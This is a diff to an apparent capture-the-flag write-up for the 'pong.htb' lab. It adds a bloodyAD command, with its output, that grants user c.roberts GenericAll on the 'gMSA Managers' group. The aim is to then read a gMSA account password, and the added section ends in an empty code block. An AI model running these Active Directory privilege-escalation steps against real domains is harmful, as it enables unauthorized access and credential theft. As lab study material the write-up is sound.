@@ -562,5 +562,16 @@ I can now check writable objects as this user `c.roberts`
 
 And as seen here i see that i have WriteDACL on this, which means i can give `c.roberts` genericAll then add them to the group in order to read the gmsa password of `Pong_gMSA$`
 
-# Adding `c.roberts` to 
+# Adding `c.roberts` to `gMSA Managers`
+
+```python
+❯❯❯ faketime -f +8h bloodyAD --host dc2.pong.htb -d pong.htb -k ccache=c.roberts@ldap_dc2.pong.htb@PONG.HTB.ccache add genericAll 'CN=gMSA Managers,CN=Users,DC=pong,DC=htb' 'S-1-5-21-750635624-2058721901-1932338391-2617'
+[+] S-1-5-21-750635624-2058721901-1932338391-2617 has now GenericAll on CN=gMSA Managers,CN=Users,DC=pong,DC=htb
+```
+
+Ill get the SID of `c.roberts` from bloodhound then add genericAll
+
+```python
+
+```
 
